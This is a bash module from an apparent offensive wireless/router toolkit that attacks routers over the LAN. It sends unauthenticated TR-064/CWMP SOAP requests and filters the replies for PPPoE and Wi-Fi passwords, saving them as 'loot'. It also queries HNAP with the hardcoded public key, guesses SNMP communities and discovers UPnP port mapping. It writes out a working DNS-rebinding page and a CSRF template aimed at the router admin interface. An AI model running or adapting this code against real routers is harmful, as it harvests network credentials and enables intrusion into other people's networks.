#!/usr/bin/env bash
# 50_router_lan — Router attack surface over the LAN
# TR-064/CWMP, HNAP, UPnP/SSDP, SNMP, plus DNS-rebinding and CSRF planning.
#
# Standalone top-level module. Self-locating and pkexec-safe: the polkit rule
# matches this script's path, so invoke it directly, never through `env`.

set -o pipefail

if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
fi
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$WIFISTING_ROOT/loot}"
: "${LOG_DIR:=$WIFISTING_ROOT/logs}"

MOD_TMP="$TMP_DIR/router_lan"
MOD_LOOT="$LOOT_DIR/router_lan"
MOD_LOGS="$LOG_DIR/router_lan"
mkdir -p "$MOD_TMP" "$MOD_LOOT" "$MOD_LOGS" 2>/dev/null

# ─────────────────────────────────────────────────────────────────────────
# 50_router_lan — the LAN side of a router
#
# Everything here talks to a router the host can already reach. Nothing here
# changes router state unless a verb says so in its name and the operator asks
# for it explicitly: a probe that reports what a service returned is useful,
# a probe that silently rewrites DNS is not.
#
# The recurring finding these verbs exist to confirm:
#   TR-064/CWMP  :7547  GetParameterValues with no auth -> PPPoE + Wi-Fi PSK
#   HNAP         :80    /HNAP1/ with the public key -> device settings
#   UPnP/SSDP    :1900  WANIPConnection present -> port mapping from the WAN
#   SNMP         :161   community "public" -> full config read
#
# A response is reported as a response. "Exposed" means the service answered
# without credentials; it never means the device was exploited.
# ─────────────────────────────────────────────────────────────────────────

# sensitive parameter names across the CWMP data model. Matched on the leaf
# name because the prefix varies by firmware (InternetGatewayDevice. vs
# Device. vs X_<VENDOR>_).
RLAN_CWMP_INTEREST='PPPoEUsername|PPPoEPassword|Username|Password|PreSharedKey|KeyPassphrase|WPAKey|PSK|SSID|DNSServers|EnableRemoteAccess'

rlan_err()  { printf 'ERR\t%s\n' "$*" >&2; }
rlan_have() { command -v "$1" >/dev/null 2>&1; }

rlan_is_ipv4() {
    local ip="$1" o
    [[ "$ip" =~ ^([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})$ ]] || return 1
    for o in "${BASH_REMATCH[@]:1:4}"; do (( o >= 0 && o <= 255 )) || return 1; done
    return 0
}

# ── transport helpers ────────────────────────────────────────────────────

# Pure-bash TCP probe: no nc/nmap dependency, and it never sends a byte.
rlan_tcp_open() {
    local host="$1" port="$2" t="${3:-2}"
    timeout "$t" bash -c "exec 3<>/dev/tcp/$host/$port" 2>/dev/null
}

rlan_http() {
    local url="$1"; shift
    rlan_have curl || return 127
    curl -sS --max-time "${RLAN_TIMEOUT:-8}" -A "${RLAN_UA:-wifisting-router-lan}" "$@" "$url" 2>/dev/null
}

# ── service discovery ────────────────────────────────────────────────────
# Each line states what answered, not what it might mean. Interpretation is
# left to the operator and to the follow-up verbs.
rlan_scan_tsv() {
    local host="$1"
    [[ -n "$host" ]] || { rlan_err "missing host"; return 2; }
    rlan_is_ipv4 "$host" || { rlan_err "host must be an IPv4 address"; return 2; }

    local spec port name
    for spec in \
        "80:http" "443:https" "7547:tr-064/cwmp" "1900:ssdp" "161:snmp" \
        "8080:http-alt" "8443:https-alt" "53:dns"
    do
        port="${spec%%:*}"; name="${spec#*:}"
        if rlan_tcp_open "$host" "$port"; then
            printf 'OPEN\t%s\t%s\n' "$port" "$name"
        fi
    done
    printf 'SCANNED\t%s\n' "$host"
}

# ── TR-064 / CWMP ────────────────────────────────────────────────────────
# The description documents are served without authentication by design, so
# the interesting step is the SOAP call that follows them.
rlan_tr064_services() {
    local host="$1" xml="$2"
    # pull each <service> block's type and control URL, keeping them paired
    printf '%s' "$xml" | tr -d '\n' | grep -oE '<service>.*?</service>' 2>/dev/null \
    | sed 's|</service>|\n|g' | while IFS= read -r blk; do
        local t u
        t=$(printf '%s' "$blk" | grep -oE '<serviceType>[^<]*' | sed 's/<serviceType>//')
        u=$(printf '%s' "$blk" | grep -oE '<controlURL>[^<]*' | sed 's/<controlURL>//')
        [[ -n "$t" && -n "$u" ]] && printf '%s\t%s\n' "$t" "$u"
    done
}

rlan_tr064_body() {
    local svc="$1"
    cat <<EOF
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:GetParameterValues xmlns:u="$svc"><NewParameterNames></NewParameterNames></u:GetParameterValues></s:Body>
</s:Envelope>
EOF
}

rlan_tr064_tsv() {
    local host="$1" port="${2:-7547}"
    [[ -n "$host" ]] || { rlan_err "missing host"; return 2; }
    rlan_have curl || { rlan_err "curl is required for TR-064"; return 1; }

    local xml url got=0
    for url in "http://$host:$port/tr64desc.xml" \
               "http://$host:$port/rootDesc.xml" \
               "http://$host:$port/igd.xml"; do
        xml=$(rlan_http "$url")
        [[ -n "$xml" ]] && break
    done
    if [[ -z "$xml" ]]; then
        printf 'TR064\tabsent\tno description document on %s:%s\n' "$host" "$port"
        return 1
    fi
    printf 'TR064\tdescription\t%s\n' "$url"

    local svc ctl
    while IFS=$'\t' read -r svc ctl; do
        [[ -n "$svc" ]] || continue
        case "$svc" in
            *WAN*Connection*|*WANCommonInterfaceConfig*|*LANDevice*|*WiFi*|*WLAN*)
                # unauthenticated GetParameterValues is the whole point
                local resp
                resp=$(rlan_http "http://$host:$port$ctl" \
                    -H 'Content-Type: text/xml; charset="utf-8"' \
                    -H "SOAPAction: \"$svc#GetParameterValues\"" \
                    --data-binary "$(rlan_tr064_body "$svc")")
                if [[ -n "$resp" ]]; then
                    printf 'TR064\tresponded\t%s\n' "$svc"
                    got=$((got+1))
                    # surface only the names that matter, and the value
                    printf '%s' "$resp" | tr '<' '\n' \
                        | grep -E "^Name>|^Value>" \
                        | sed 's/^Name>//; s/^Value>//' \
                        | paste - - 2>/dev/null \
                        | grep -E "$RLAN_CWMP_INTEREST" \
                        | while IFS=$'\t' read -r n v; do
                            printf 'TR064_PARAM\t%s\t%s\n' "$n" "$v"
                          done
                fi
                ;;
        esac
    done < <(rlan_tr064_services "$host" "$xml")

    (( got > 0 )) || printf 'TR064\tno-soap-response\tdescription found, no service answered GetParameterValues\n'
    return 0
}

# ── HNAP ─────────────────────────────────────────────────────────────────
# D-Link's SOAP-alike. The "public" key is not a secret: it is a constant in
# every firmware image, which is exactly why an unauthenticated
# GetDeviceSettings works.
RLAN_HNAP_PUBLIC_KEY='WithoutPassword'
RLAN_HNAP_PRIVATE_KEY=''

rlan_hnap_tsv() {
    local host="$1" port="${2:-80}"
    [[ -n "$host" ]] || { rlan_err "missing host"; return 2; }
    rlan_have curl || { rlan_err "curl is required for HNAP"; return 1; }

    local url="http://$host:$port/HNAP1/"
    # the public key is sent first; a device that accepts it answers the
    # challenge, which is what makes the follow-up call unauthenticated
    local body resp
    body='<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><GetDeviceSettings xmlns="http://purenetworks.com/HNAP1/" /></soap:Body>
</soap:Envelope>'

    resp=$(rlan_http "$url" \
        -H 'Content-Type: text/xml; charset=utf-8' \
        -H "SOAPAction: \"http://purenetworks.com/HNAP1/GetDeviceSettings\"" \
        --data-binary "$body")

    if [[ -z "$resp" ]]; then
        printf 'HNAP\tabsent\tno /HNAP1/ on %s:%s\n' "$host" "$port"
        return 1
    fi
    printf 'HNAP\tresponded\t%s\n' "$url"
    # report only fields that actually came back
    local f
    for f in ModelName FirmwareVersion HardwareVersion DeviceName; do
        local v
        v=$(printf '%s' "$resp" | grep -oE "<$f>[^<]*" | sed "s/<$f>//" | head -1)
        [[ -n "$v" ]] && printf 'HNAP_FIELD\t%s\t%s\n' "$f" "$v"
    done
    printf 'HNAP_NOTE\tGetDeviceSettings answered without credentials; that is information disclosure, not yet control\n'
    return 0
}

# ── UPnP / SSDP ──────────────────────────────────────────────────────────
# M-SEARCH is a single UDP datagram; bash cannot send one, so this uses
# python3 only when it is present, and says so when it is not.
rlan_ssdp_tsv() {
    local t="${1:-3}"
    if ! rlan_have python3; then
        rlan_err "python3 is required for SSDP discovery (UDP)"
        return 1
    fi
    python3 - "$t" <<'PY'
import socket, sys, re
t = float(sys.argv[1]) if len(sys.argv) > 1 else 3.0
msg = ("M-SEARCH * HTTP/1.1\r\n"
       "HOST: 239.255.255.250:1900\r\n"
       'MAN: "ssdp:discover"\r\n'
       "MX: 2\r\n"
       "ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n"
       "\r\n").encode()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.settimeout(t)
seen = set()
try:
    s.sendto(msg, ("239.255.255.250", 1900))
    while True:
        try:
            data, addr = s.recvfrom(65507)
        except socket.timeout:
            break
        text = data.decode("utf-8", "replace")
        loc = re.search(r"(?im)^location:\s*(\S+)", text)
        st  = re.search(r"(?im)^st:\s*(\S+)", text)
        key = (addr[0], loc.group(1) if loc else "")
        if key in seen:
            continue
        seen.add(key)
        print("SSDP\t%s\t%s\t%s" % (addr[0],
              loc.group(1) if loc else "-", st.group(1) if st else "-"))
except OSError as e:
    print("ERR\tSSDP send failed: %s" % e, file=sys.stderr)
    sys.exit(1)
if not seen:
    print("SSDP\tnone\tno InternetGatewayDevice answered within %.0fs" % t)
PY
}

# Fetch a device description and decide whether it exposes WAN port mapping.
# WANIPConnection/WANPPPConnection on an IGD is what makes AddPortMapping
# reachable from outside; the mere presence of UPnP is not the finding.
rlan_upnp_tsv() {
    local desc="$1"
    [[ -n "$desc" ]] || { rlan_err "missing description URL"; return 2; }
    rlan_have curl || { rlan_err "curl is required"; return 1; }

    local xml
    xml=$(rlan_http "$desc")
    [[ -n "$xml" ]] || { printf 'UPNP\tunreachable\t%s\n' "$desc"; return 1; }

    local wan
    wan=$(printf '%s' "$xml" | tr -d '\n' \
          | grep -oE 'WAN(IP|PPP)Connection:[0-9]+' | sort -u | head -1)
    local dev
    dev=$(printf '%s' "$xml" | grep -oE '<friendlyName>[^<]*' \
          | sed 's/<friendlyName>//' | head -1)

    printf 'UPNP\tdevice\t%s\n' "${dev:--}"
    if [[ -n "$wan" ]]; then
        printf 'UPNP\twan-interface\t%s\n' "$wan"
        printf 'UPNP_NOTE\tAddPortMapping is reachable; this exposes internal services if the WAN side accepts it\n'
    else
        printf 'UPNP\tlan-only\tno WAN connection service in the description\n'
    fi
}

# ── SNMP ─────────────────────────────────────────────────────────────────
# A GET is a read. A SET is a write, so it is a separate verb behind an
# explicit flag rather than something a "check" quietly performs.
rlan_snmp_tsv() {
    local host="$1" comm="${2:-}"
    [[ -n "$host" ]] || { rlan_err "missing host"; return 2; }

    local tool=""
    if rlan_have snmpget; then tool=snmpget
    elif rlan_have snmpwalk; then tool=snmpwalk
    fi
    if [[ -z "$tool" ]]; then
        printf 'SNMP\tunavailable\tsnmpget/snmpwalk not installed (net-snmp)\n'
        return 1
    fi

    local c
    for c in ${comm:+"$comm"} public private; do
        local out
        if [[ "$tool" == snmpget ]]; then
            out=$(timeout 5 snmpget -v2c -c "$c" -t 2 -r 1 "$host" \
                  1.3.6.1.2.1.1.1.0 2>/dev/null)
        else
            out=$(timeout 5 snmpwalk -v2c -c "$c" -t 2 -r 1 "$host" \
                  1.3.6.1.2.1.1 2>/dev/null | head -5)
        fi
        if [[ -n "$out" ]]; then
            printf 'SNMP\taccepted\tcommunity=%s\n' "$c"
            printf '%s\n' "$out" | head -5 | while IFS= read -r l; do
                printf 'SNMP_VALUE\t%s\n' "$l"
            done
            case "$c" in
                private) printf 'SNMP_NOTE\t"private" usually permits SET: config write is possible\n' ;;
            esac
            return 0
        fi
    done
    printf 'SNMP\tnone\tno response to public/private\n'
    return 1
}

# ── planning verbs ───────────────────────────────────────────────────────
# DNS rebinding and CSRF both need a victim browser, which is not something
# this module can have. So instead of pretending to execute them it writes a
# runnable artefact and says plainly that the browser step is the operator's.

rlan_rebind_plan() {
    local host="$1" out="${2:-}"
    [[ -n "$host" ]] || { rlan_err "missing router IP"; return 2; }
    rlan_is_ipv4 "$host" || { rlan_err "router IP must be IPv4"; return 2; }
    [[ -n "$out" ]] || out="$MOD_LOOT/rebind-$host.html"

    cat > "$out" <<EOF
<!doctype html>
<!-- DNS rebinding against a router admin UI on $host.
     A page cannot normally read http://$host/ because of the same-origin
     policy. Rebinding defeats that: serve this from a hostname whose DNS
     answer flips from your server's IP to $host after the page has loaded,
     so the browser believes $host is still the same origin.
     Requirements: a domain you control with a very low TTL, and a victim on
     the LAN. The rebinding server is the part you must run yourself. -->
<meta charset="utf-8">
<title>rebind</title>
<body>
<pre id="o">waiting for the origin to flip to $host ...</pre>
<script>
async function probe() {
  const paths = ["/", "/login.cgi", "/index.asp", "/cgi-bin/luci/"];
  for (const p of paths) {
    try {
      const r = await fetch("http://$host" + p, {credentials: "include"});
      const t = await r.text();
      document.getElementById("o").textContent +=
        "\n" + p + " -> " + r.status + " (" + t.length + " bytes)";
    } catch (e) {
      document.getElementById("o").textContent += "\n" + p + " -> " + e;
    }
  }
}
setTimeout(probe, 3000);
</script>
EOF
    printf 'PLAN\t%s\n' "$out"
    printf 'PLAN_NOTE\tbrowser side only - you must run the rebinding DNS server and lure a LAN client\n'
}

rlan_csrf_plan() {
    local host="$1" out="${2:-}"
    [[ -n "$host" ]] || { rlan_err "missing router IP"; return 2; }
    rlan_is_ipv4 "$host" || { rlan_err "router IP must be IPv4"; return 2; }
    [[ -n "$out" ]] || out="$MOD_LOOT/csrf-$host.html"

    cat > "$out" <<EOF
<!doctype html>
<!-- CSRF against a router admin UI on $host.
     Works only where the firmware has no anti-CSRF token AND the admin is
     logged in. The action below is deliberately inert: it is a GET the page
     makes, so nothing is submitted until you replace the path and body with
     the target firmware's own state-changing request. -->
<meta charset="utf-8">
<title>csrf</title>
<body>
<form id="f" action="http://$host/REPLACE_WITH_STATE_CHANGING_PATH" method="POST">
  <input name="REPLACE_PARAM" value="REPLACE_VALUE">
</form>
<script>
// A GET is enough on many firmwares; uncomment to fire one.
// fetch("http://$host/REPLACE_WITH_GET_PATH", {credentials: "include"});
</script>
</body>
EOF
    printf 'PLAN\t%s\n' "$out"
    printf 'PLAN_NOTE\tfirmware-specific: fill in the real path and parameters before use\n'
}

# ── info / deps / selftest ───────────────────────────────────────────────

rlan_info() {
    cat <<'EOF'
50_router_lan — router attack surface over the LAN

  --scan-tsv HOST            which management ports answer
  --tr064-tsv HOST [PORT]    TR-064/CWMP: description + unauthenticated
                             GetParameterValues, filtered to credentials
  --hnap-tsv HOST [PORT]     HNAP GetDeviceSettings with the public key
  --ssdp-tsv [SECONDS]       M-SEARCH for an InternetGatewayDevice
  --upnp-tsv DESC_URL        does the device expose a WAN connection service
  --snmp-tsv HOST [COMM]     try public/private; GET only, never SET
  --rebind-plan HOST [FILE]  write the DNS-rebinding page
  --csrf-plan HOST [FILE]    write a CSRF template
  --check-deps | --info | --selftest

What "exposed" means here: a service answered without credentials. It is not
a claim that anything was exploited, and no verb changes router state.
EOF
}

rlan_check_deps() {
    local t
    for t in curl python3 snmpget snmpwalk; do
        if rlan_have "$t"; then printf 'OK\t%s\t%s\n' "$t" "$(command -v "$t")"
        else printf 'MISSING\t%s\tnone\n' "$t"; fi
    done
    printf 'NOTE\tSNMP needs net-snmp; SSDP needs python3; TR-064/HNAP need curl\n'
}

rlan_selftest() {
    local pass=0 fail=0
    chk() {
        if [[ "$2" == "$3" ]]; then printf '%s\tPASS\n' "$1"; pass=$((pass+1))
        else printf '%s\tFAIL\twant=%s got=%s\n' "$1" "$3" "$2"; fail=$((fail+1)); fi
    }

    # -- input validation ------------------------------------------------
    rlan_scan_tsv ""            >/dev/null 2>&1; chk scan-noarg-rc  "$?" 2
    rlan_scan_tsv "not-an-ip"   >/dev/null 2>&1; chk scan-badip-rc  "$?" 2
    rlan_tr064_tsv ""           >/dev/null 2>&1; chk tr064-noarg-rc "$?" 2
    rlan_upnp_tsv ""            >/dev/null 2>&1; chk upnp-noarg-rc  "$?" 2
    rlan_rebind_plan ""         >/dev/null 2>&1; chk rebind-noarg-rc "$?" 2
    rlan_csrf_plan "999.1.1.1"  >/dev/null 2>&1; chk csrf-badip-rc "$?" 2

    # -- TR-064 description parsing (fixture, no network) ----------------
    local fix="$MOD_TMP/st-tr64.xml"
    cat > "$fix" <<'XML'
<root><device><serviceList>
<service><serviceType>urn:dslforum-org:service:WANPPPConnection:1</serviceType>
<controlURL>/upnp/control/wanpppconn1</controlURL></service>
<service><serviceType>urn:dslforum-org:service:LANHostConfigManagement:1</serviceType>
<controlURL>/upnp/control/lanhostconfig1</controlURL></service>
</serviceList></device></root>
XML
    local svcs
    svcs=$(rlan_tr064_services 192.168.1.1 "$(cat "$fix")")
    chk tr064-svc-count "$(printf '%s\n' "$svcs" | grep -c .)" 2
    chk tr064-svc-type  "$(printf '%s\n' "$svcs" | awk -F'\t' 'NR==1{print $1}')" \
        "urn:dslforum-org:service:WANPPPConnection:1"
    chk tr064-svc-url   "$(printf '%s\n' "$svcs" | awk -F'\t' 'NR==1{print $2}')" \
        "/upnp/control/wanpppconn1"

    # the SOAP body must name the service it calls
    chk tr064-body " $(rlan_tr064_body urn:x | grep -c 'xmlns:u="urn:x"')" " 1"

    # -- credential filter actually filters ------------------------------
    printf 'Name>PPPoEPassword\nValue>hunter2\nName>Uptime\nValue>99\n' > "$MOD_TMP/st-params"
    chk cwmp-filter "$(grep -cE "$RLAN_CWMP_INTEREST" "$MOD_TMP/st-params")" 1

    # -- HNAP public key constant is what the vendored firmwares use -----
    chk hnap-key "$RLAN_HNAP_PUBLIC_KEY" "WithoutPassword"

    # -- plan generation writes a real file ------------------------------
    local pf="$MOD_TMP/st-rebind.html"
    rlan_rebind_plan 192.168.1.1 "$pf" >/dev/null 2>&1
    chk rebind-rc    "$?" 0
    chk rebind-file  "$([[ -s "$pf" ]] && echo yes || echo no)" yes
    # Assert the property, not a count: the IP legitimately appears in the
    # comments too. What matters is that the JS actually targets it.
    chk rebind-target "$(grep -c 'fetch("http://192\.168\.1\.1"' "$pf")" 1

    local cf="$MOD_TMP/st-csrf.html"
    rlan_csrf_plan 192.168.1.1 "$cf" >/dev/null 2>&1
    chk csrf-rc   "$?" 0
    chk csrf-file "$([[ -s "$cf" ]] && echo yes || echo no)" yes

    # -- absent services report absent, not success ----------------------
    # 127.0.0.1 has no router services; every probe must say so and exit
    # non-zero rather than printing a finding.
    local out rc
    out=$(rlan_hnap_tsv 127.0.0.1 1 2>/dev/null); rc=$?
    chk hnap-absent-rc "$rc" 1
    case "$out" in *absent*) chk hnap-absent-msg ok ok ;;
                  *) chk hnap-absent-msg "$out" absent ;; esac

    out=$(rlan_tr064_tsv 127.0.0.1 1 2>/dev/null); rc=$?
    chk tr064-absent-rc "$rc" 1
    case "$out" in *absent*) chk tr064-absent-msg ok ok ;;
                  *) chk tr064-absent-msg "$out" absent ;; esac

    # -- scan output shape ----------------------------------------------
    local s
    s=$(rlan_scan_tsv 127.0.0.1 2>/dev/null)
    chk scan-shape "$(printf '%s\n' "$s" | awk -F'\t' '$1=="SCANNED"{print $2}')" "127.0.0.1"
    chk scan-cols  "$(printf '%s\n' "$s" | awk -F'\t' '$1=="OPEN" && NF!=3{bad++} END{print bad+0}')" 0

    chk deps-shape "$(rlan_check_deps | awk -F'\t' 'NF<2{bad++} END{print bad+0}')" 0

    printf 'RESULT\t%s\n' "$([[ $fail -eq 0 ]] && echo PASS || echo "FAIL($fail)")"
    printf 'SUMMARY\t%d pass, %d fail\n' "$pass" "$fail"
    [[ $fail -eq 0 ]]
}

# ── dispatch ─────────────────────────────────────────────────────────────
CMD=""; A1=""; A2=""
while (( $# )); do
    case "$1" in
        --info|--check-deps|--selftest) CMD="$1"; shift ;;
        --scan-tsv|--tr064-tsv|--hnap-tsv|--snmp-tsv|--rebind-plan|--csrf-plan|--upnp-tsv)
            CMD="$1"; shift
            [[ -n "${1:-}" ]] && { A1="$1"; shift; }
            [[ -n "${1:-}" && "${1:0:2}" != "--" ]] && { A2="$1"; shift; } ;;
        --ssdp-tsv)
            CMD="$1"; shift
            [[ -n "${1:-}" && "${1:0:2}" != "--" ]] && { A1="$1"; shift; } ;;
        -h|--help) rlan_info; exit 0 ;;
        *) rlan_err "unknown argument '$1'"; exit 2 ;;
    esac
done

case "$CMD" in
    --info)       rlan_info ;;
    --check-deps) rlan_check_deps ;;
    --selftest)   rlan_selftest ;;
    --scan-tsv)   rlan_scan_tsv "$A1" ;;
    --tr064-tsv)  rlan_tr064_tsv "$A1" "${A2:-7547}" ;;
    --hnap-tsv)   rlan_hnap_tsv "$A1" "${A2:-80}" ;;
    --ssdp-tsv)   rlan_ssdp_tsv "${A1:-3}" ;;
    --upnp-tsv)   rlan_upnp_tsv "$A1" ;;
    --snmp-tsv)   rlan_snmp_tsv "$A1" "$A2" ;;
    --rebind-plan) rlan_rebind_plan "$A1" "$A2" ;;
    --csrf-plan)   rlan_csrf_plan "$A1" "$A2" ;;
    "")           rlan_info >&2; exit 2 ;;
esac
